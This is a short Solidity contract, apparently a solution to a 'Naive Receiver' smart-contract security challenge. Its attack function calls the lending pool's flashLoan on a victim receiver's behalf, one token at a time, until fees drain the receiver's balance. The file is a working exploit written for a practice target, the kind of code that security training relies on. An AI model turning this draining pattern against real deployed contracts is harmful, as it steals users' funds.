// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";

contract NaiveReceiverAttack {
    NaiveReceiverLenderPool pool;
    address receiverAddress;

    constructor(address payable _poolAddress, address _receiverAddress) {
        pool = NaiveReceiverLenderPool(_poolAddress);
        receiverAddress = _receiverAddress;
    }

    function attack() external {
        while (receiverAddress.balance > 0) {
            pool.flashLoan(receiverAddress, 1);
        }
    }
}
